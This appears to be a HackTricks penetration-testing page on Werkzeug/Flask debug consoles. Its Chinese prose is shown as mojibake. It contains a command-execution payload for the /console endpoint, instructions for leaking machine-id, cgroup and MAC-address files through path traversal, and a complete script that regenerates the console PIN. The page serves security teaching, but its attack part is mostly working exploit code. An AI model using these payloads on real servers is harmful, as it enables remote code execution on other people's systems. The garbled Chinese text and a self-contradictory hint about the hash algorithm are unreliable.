# Werkzeug / Flask Debug

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference es un evento internacional de ciberseguridad**](https://www.dragonjarcon.org/) con mÃ¡s de una dÃ©cada que se celebrarÃ¡ el 7 y 8 de septiembre de 2023 en BogotÃ¡, Colombia. Es un evento de gran contenido tÃ©cnico donde se presentan las Ãºltimas investigaciones en espaÃ±ol que atrae a hackers e investigadores de todo el mundo.\
Â¡RegÃ­strate ahora en el siguiente enlace y no te pierdas esta gran conferencia!:

{% embed url="https://www.dragonjarcon.org" %}

## æ§åˆ¶å°è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰

å¦‚æœè°ƒè¯•æ¨¡å¼å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œæ‚¨å¯ä»¥å°è¯•è®¿é—®`/console`å¹¶è·å¾—RCEã€‚
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

äº’è”ç½‘ä¸Šè¿˜æœ‰ä¸€äº›æ¼æ´ï¼Œæ¯”å¦‚[è¿™ä¸ª](https://github.com/its-arun/Werkzeug-Debug-RCE)æˆ–è€…Metasploitä¸­çš„ä¸€ä¸ªã€‚

## å—ä¿æŠ¤çš„ PIN - è·¯å¾„éå†

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ**`/console`** ç«¯ç‚¹å°†å—åˆ° PIN çš„ä¿æŠ¤ã€‚å¦‚æœæ‚¨æœ‰ä¸€ä¸ª**æ–‡ä»¶éå†æ¼æ´**ï¼Œæ‚¨å¯ä»¥æ³„éœ²æ‰€æœ‰å¿…è¦çš„ä¿¡æ¯æ¥ç”Ÿæˆè¯¥ PINã€‚

### Werkzeug æ§åˆ¶å° PIN æ¼æ´åˆ©ç”¨

**ä»ç¬¬ä¸€ä¸ªé“¾æ¥ä¸­å¤åˆ¶ã€‚**\
é€šè¿‡åœ¨åº”ç”¨ç¨‹åºä¸­å¼ºåˆ¶è°ƒè¯•é”™è¯¯é¡µé¢ï¼ŒæŸ¥çœ‹ Werkzeug çš„â€œæ§åˆ¶å°å·²é”å®šâ€æ¶ˆæ¯ã€‚
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
å®šä½æ˜“å—æ”»å‡»çš„Werkzeugè°ƒè¯•æ§åˆ¶å°ï¼Œè·¯å¾„ä¸º`vulnerable-site.com/console`ï¼Œä½†è¢«ç§˜å¯†çš„PINç é”å®šã€‚

æ‚¨å¯ä»¥åå‘ç®—æ³•ç”Ÿæˆæ§åˆ¶å°PINç ã€‚æ£€æŸ¥æœåŠ¡å™¨ä¸Šçš„Werkzeugè°ƒè¯•`__init__.py`æ–‡ä»¶ï¼Œä¾‹å¦‚`python3.5/site-packages/werkzeug/debug/__init__.py`ã€‚æ‚¨å¯ä»¥æŸ¥çœ‹[Werkzeugæºä»£ç å­˜å‚¨åº“](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/__init__.py)æ¥æ£€æŸ¥PINç çš„ç”Ÿæˆæ–¹å¼ï¼Œä½†æœ€å¥½é€šè¿‡æ–‡ä»¶éå†æ¼æ´æ³„éœ²æºä»£ç ï¼Œå› ä¸ºç‰ˆæœ¬å¯èƒ½ä¸åŒã€‚

åˆ©ç”¨æ§åˆ¶å°PINç æ‰€éœ€çš„å˜é‡ï¼š
```python
probably_public_bits = [
username,
modname,
getattr(app, '__name__', getattr(app.__class__, '__name__')),
getattr(mod, '__file__', None),
]

private_bits = [
str(uuid.getnode()),
get_machine_id(),
]
```
#### **`probably_public_bits`**

* **`username`** æ˜¯å¯åŠ¨æ­¤ Flask åº”ç”¨ç¨‹åºçš„ç”¨æˆ·
* **`modname`** æ˜¯ flask.app
* `getattr(app, '__name__', getattr (app .__ class__, '__name__'))` æ˜¯ **Flask**
* `getattr(mod, '__file__', None)` æ˜¯ flask ç›®å½•ä¸­ `app.py` çš„ **ç»å¯¹è·¯å¾„**ï¼ˆä¾‹å¦‚ `/usr/local/lib/python3.5/dist-packages/flask/app.py`ï¼‰ã€‚å¦‚æœ `app.py` ä¸èµ·ä½œç”¨ï¼Œ**å°è¯• `app.pyc`**

#### `private_bits`

*   `uuid.getnode()` æ˜¯å½“å‰è®¡ç®—æœºçš„ **MAC åœ°å€**ï¼Œ`str(uuid.getnode())` æ˜¯ MAC åœ°å€çš„åè¿›åˆ¶è¡¨ç¤ºã€‚

* è¦ **æŸ¥æ‰¾æœåŠ¡å™¨çš„ MAC åœ°å€**ï¼Œéœ€è¦çŸ¥é“ç”¨äºæä¾›åº”ç”¨ç¨‹åºçš„ **ç½‘ç»œæ¥å£**ï¼ˆä¾‹å¦‚ `ens3`ï¼‰ã€‚å¦‚æœä¸çŸ¥é“ï¼Œå¯ä»¥åœ¨è®¾å¤‡ ID ä¸Š **æ³„æ¼ `/proc/net/arp`**ï¼Œç„¶ååœ¨ **`/sys/class/net/<device id>/address`** ä¸­æ³„æ¼ MAC åœ°å€ã€‚

é€šè¿‡åœ¨ Python ä¸­è¿è¡Œä»¥ä¸‹ä»£ç å°† **åå…­è¿›åˆ¶åœ°å€è½¬æ¢ä¸ºåè¿›åˆ¶** è¡¨ç¤ºï¼š

```python
# It was 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* `get_machine_id()` å°† `/etc/machine-id` æˆ– **`/proc/sys/kernel/random/boot_id`** ä¸­çš„å€¼ä¸ **`/proc/self/cgroup`** æœ€åä¸€ä¸ªæ–œæ  (`/`) åçš„ç¬¬ä¸€è¡Œè¿æ¥èµ·æ¥ã€‚

<details>

<summary>get_machine_id() ä»£ç </summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

å‡†å¤‡å¥½æ‰€æœ‰å˜é‡åï¼Œè¿è¡Œåˆ©ç”¨è„šæœ¬ä»¥ç”ŸæˆWerkzeugæ§åˆ¶å°PINç ï¼š
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',# username
'flask.app',# modname
'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
]

#h = hashlib.md5() # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
#h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
{% hint style="success" %}
å¦‚æœä½ ä½¿ç”¨çš„æ˜¯**æ—§ç‰ˆæœ¬**çš„Werkzeugï¼Œè¯·å°è¯•å°†**å“ˆå¸Œç®—æ³•æ›´æ”¹ä¸ºmd5**ï¼Œè€Œä¸æ˜¯md5ã€‚
{% endhint %}

## å‚è€ƒèµ„æ–™

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (4).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conferenceæ˜¯ä¸€åœºå›½é™…ç½‘ç»œå®‰å…¨æ´»åŠ¨**](https://www.dragonjarcon.org/)ï¼Œå·²ç»ä¸¾åŠäº†åå¤šå¹´ï¼Œå°†äº2023å¹´9æœˆ7æ—¥è‡³8æ—¥åœ¨å“¥ä¼¦æ¯”äºšæ³¢å“¥å¤§ä¸¾è¡Œã€‚è¿™æ˜¯ä¸€ä¸ªå†…å®¹ä¸°å¯Œçš„æŠ€æœ¯æ´»åŠ¨ï¼Œå±•ç¤ºäº†å¸å¼•å…¨çƒé»‘å®¢å’Œç ”ç©¶äººå‘˜çš„æœ€æ–°è¥¿ç­ç‰™è¯­ç ”ç©¶æˆæœã€‚\
ç«‹å³åœ¨ä»¥ä¸‹é“¾æ¥æ³¨å†Œï¼Œä¸è¦é”™è¿‡è¿™ä¸ªé‡è¦çš„ä¼šè®®ï¼:

{% embed url="https://www.dragonjarcon.org" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦åœ¨HackTricksä¸­**å®£ä¼ ä½ çš„å…¬å¸**å—ï¼Ÿæˆ–è€…ä½ æƒ³è¦**è·å–PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„åŠ¨æ€[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
